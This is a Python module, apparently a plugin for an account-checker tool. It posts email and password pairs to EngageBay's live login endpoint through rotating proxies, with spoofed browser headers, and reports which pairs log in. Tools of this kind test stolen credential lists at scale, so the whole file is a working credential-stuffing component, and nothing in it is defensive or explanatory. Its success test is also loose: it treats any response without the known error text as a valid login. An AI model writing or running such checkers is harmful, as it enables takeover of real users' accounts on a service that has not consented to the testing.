"""
Checker for EngageBay (app.engagebay.com)
Uses the /rest/api/login/get-domain endpoint.
"""
import requests
import threading
from typing import Tuple

BASE_URL = "https://app.engagebay.com"
LOGIN_URL = BASE_URL + "/rest/api/login/get-domain"
TIMEOUT = 15

def check(email: str, password: str) -> Tuple[bool, str]:
    proxy = getattr(threading.current_thread(), 'proxy', None)

    session = requests.Session()
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": BASE_URL,
        "Referer": BASE_URL + "/login",
        "Connection": "keep-alive",
    })

    payload = {
        "email": email,
        "password": password,
    }

    try:
        resp = session.post(LOGIN_URL, data=payload, timeout=TIMEOUT)
        # The response should be JSON
        try:
            data = resp.json()
        except ValueError:
            return False, f"Invalid JSON response: {resp.text[:100]}"

        # Check for success indicator
        # If login succeeds, the response likely contains domain info and status.
        # The known failure message is: "The username or password you entered is incorrect."
        if isinstance(data, dict):
            # Look for error message
            if "message" in data and "incorrect" in data["message"].lower():
                return False, f"Login failed: {data['message']}"
            # If no error and status is success, treat as valid
            if data.get("status") == "success" or data.get("success") is True:
                return True, "Login successful"
            # If there is a domain field, also success
            if "domain" in data:
                return True, f"Login successful (domain: {data['domain']})"
            # Fallback: if we have a response and no error, assume success
            # But to be safe, check if the error string is not present
            if "The username or password you entered is incorrect" not in resp.text:
                return True, "Login successful (assumed from response)"
            else:
                return False, "Invalid credentials (error message found)"
        else:
            # If response is not a dict, maybe it's a plain string
            if "incorrect" in resp.text.lower():
                return False, "Invalid credentials"
            return True, "Login successful"

    except requests.exceptions.Timeout:
        return False, "Request timed out"
    except requests.exceptions.ConnectionError:
        return False, "Connection error"
    except Exception as e:
        return False, f"Unexpected error: {str(e)}"